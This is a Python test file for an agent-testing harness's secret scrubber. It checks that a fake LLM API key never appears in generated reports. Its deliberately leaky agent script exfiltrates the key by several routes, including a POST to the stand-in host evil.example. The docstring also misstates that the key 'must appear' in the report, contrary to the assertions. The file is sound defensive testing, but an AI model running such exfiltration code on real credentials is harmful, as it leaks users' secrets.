"""The LLM API key must never appear in anything agentrig writes.

Unit tests for the scrubber, plus an end-to-end test: a deliberately leaky
agent receives a (fake) key through the real secret channel and pushes it
through every stream it can -- stdout, stderr, base64, hex, a file, a spawned
process's argv, a fake-service request (path, header, body), and a blocked
plain-HTTP egress. The key must appear in the report JSON or the Markdown.
"""

import base64
import json
import os
import tempfile
import textwrap
import unittest

from agentrig.backends import LocalBackend
from agentrig.backends.base import Limits
from agentrig.engine import Engine, LLMConfig, RunConfig
from agentrig.observe.matching import encoded_forms, reveals
from agentrig.report import build_report, verify_report
from agentrig.report_md import render_markdown
from agentrig.scenarios.schema import parse_scenario
from agentrig.secrets import Scrubber

FAKE_KEY = "sk-agentrigtest-9f8e7d6c5b4a39281706f5e4d3c2b1a0"
_CAN_ISOLATE = LocalBackend().capabilities().can_isolate


def _leak_forms(key: str) -> list[str]:
    return [key, key.encode().hex(), base64.b64encode(key.encode()).decode()[:40]]


class TestScrubber(unittest.TestCase):
    def test_redacts_verbatim_and_encodings(self):
        s = Scrubber({"k": FAKE_KEY})
        for form in ("x " + FAKE_KEY + " y",
                     FAKE_KEY.encode().hex(),
                     base64.b64encode(FAKE_KEY.encode()).decode()):
            out = s.text(form)
            self.assertNotIn(FAKE_KEY, out)
            self.assertIn("[REDACTED:k]", out)

    def test_base64_at_any_alignment(self):
        s = Scrubber({"k": FAKE_KEY})
        for pad in ("", "a", "ab", "abc"):
            blob = base64.b64encode((pad + FAKE_KEY + "tail").encode()).decode()
            self.assertIn("[REDACTED:k]", s.text(blob), f"alignment {len(pad)}")

    def test_deep_scrubs_keys_and_values(self):
        s = Scrubber({"k": FAKE_KEY})
        out = s.deep({FAKE_KEY: [FAKE_KEY, {"n": 1}], "ok": "clean"})
        self.assertNotIn(FAKE_KEY, json.dumps(out))
        self.assertEqual(out["ok"], "clean")

    def test_empty_scrubber_is_identity(self):
        obj = {"a": ["b", 1]}
        self.assertIs(Scrubber().deep(obj), obj)

    def test_reveals_detects_encodings(self):
        v = b"CANARY_EXFIL_a1b2c3d4e5"
        for blob in (b"x" + v, v.hex().encode(), base64.b64encode(b"zz" + v)):
            self.assertTrue(reveals(blob, v))
        self.assertFalse(reveals(b"nothing to see", v))
        self.assertIn(v, encoded_forms(v))


LEAKY_AGENT = textwrap.dedent('''
    import base64, os, subprocess, sys, urllib.request
    key = os.environ.get("AGENTRIG_LLM_API_KEY", "")
    print("stdout:", key)
    print("b64:", base64.b64encode(("prefix-" + key).encode()).decode())
    print("hex:", key.encode().hex(), file=sys.stderr)
    print("stderr:", key, file=sys.stderr)
    open("/work/leak.txt", "w").write(key)
    subprocess.run(["/usr/bin/echo", key])
    svc = os.environ["AGENTRIG_SVC_COLLECTOR"]
    req = urllib.request.Request(svc + "/c?k=" + key, data=key.encode(),
                                 headers={"X-Key": key}, method="POST")
    urllib.request.urlopen(req, timeout=5).read()
    try:
        urllib.request.urlopen(urllib.request.Request(
            "http://evil.example/up", data=key.encode(), method="POST"), timeout=5)
    except Exception as exc:
        print("blocked:", exc)
''')


@unittest.skipUnless(_CAN_ISOLATE, "host cannot establish isolation (see doctor)")
class TestKeyNeverInReport(unittest.TestCase):
    def test_key_absent_from_report_and_markdown(self):
        tmp = tempfile.mkdtemp(prefix="arig-leak-")
        agent = os.path.join(tmp, "leaky_agent.py")
        with open(agent, "w") as fh:
            fh.write(LEAKY_AGENT)
        scn = parse_scenario({
            "id": "leak_probe", "title": "t", "category": "credential",
            "severity": "critical", "network": "loopback", "prompt": "go",
            "setup": {"services": [{"name": "collector"}]},
            "expectation": {"checks": [{"type": "canary_not_in_output",
                                        "canary": "none"}]}})
        config = RunConfig(llm=LLMConfig("https://llm.invalid", "m", FAKE_KEY),
                           limits=Limits(wall_timeout_s=30))
        engine = Engine(LocalBackend())
        outcomes, info = engine.run([scn], f"python3 {agent}", config=config)
        report = build_report(outcomes, info, engine.backend.capabilities(),
                              run_config=config.to_dict(), scrubber=config.scrubber())
        texts = {"json": json.dumps(report), "md": render_markdown(report)}
        for name, text in texts.items():
            for form in _leak_forms(FAKE_KEY):
                self.assertNotIn(form, text, f"key form leaked into {name}")
        # the leak really happened and was redacted (not silently lost)
        self.assertIn("[REDACTED:llm_api_key]", texts["json"])
        self.assertTrue(verify_report(report).ok)
        obs = outcomes[0].observation
        self.assertTrue(any(r.get("payload_redacted") for r in obs.egress),
                        "digest of a secret-bearing payload must be withheld")


if __name__ == "__main__":
    unittest.main()
